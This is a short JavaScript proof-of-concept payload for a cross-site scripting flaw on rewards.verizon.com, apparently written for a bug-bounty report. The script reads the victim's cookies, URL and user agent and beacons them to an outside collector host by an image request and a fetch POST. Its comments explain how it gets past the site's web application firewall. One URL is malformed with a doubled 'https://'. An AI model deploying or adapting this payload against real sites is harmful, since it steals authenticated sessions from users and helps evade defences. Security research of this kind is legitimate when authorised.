// REP-127 imported payload. Served from your httpworkbench instance, loaded via
// import() by 1-deliver.html, and executed in the rewards.verizon.com origin.
//
// This script is fetched from your host, so the rewards.verizon.com SigSci WAF never
// inspects it. That is why document.cookie works here even though a raw "document.cookie"
// in the vz_jwt payload itself is blocked (HTTP 406). This is the impact proof: arbitrary
// attacker JavaScript running in the victim's authenticated rewards.verizon.com session.
//
// BEFORE USE: replace {WEBHOOK_URL} with your collector (can be the same httpworkbench
// instance's request log, a webhook.site URL, or a Burp Collaborator host).

(function () {
  var proof =
    "origin=" + location.origin +
    "|url=" + location.href +
    "|cookie=" + document.cookie +
    "|ua=" + navigator.userAgent;

  // Beacon 1: image GET (survives most CSP connect-src configs; no CORS needed)
  try { new Image().src = "https://j1lyucxvd6v9kdpuk4u75cy8wz2qqge5.oastify.com/b?" + encodeURIComponent(proof); } catch (e) {}

  // Beacon 2: fetch fallback
  try {
    fetch("https://https://j1lyucxvd6v9kdpuk4u75cy8wz2qqge5.oastify.com/b", {
      method: "POST",
      mode: "no-cors",
      body: proof
    });
  } catch (e) {}

  // Visible marker so a human PoC screenshot shows execution in-origin.
  try {
    var d = document.createElement("div");
    d.textContent = "REP-127 XSS executed in " + location.origin;
    d.style.cssText =
      "position:fixed;top:0;left:0;right:0;z-index:2147483647;" +
      "background:#b00020;color:#fff;font:16px/2.2 sans-serif;text-align:center";
    document.documentElement.appendChild(d);
  } catch (e) {}
})();
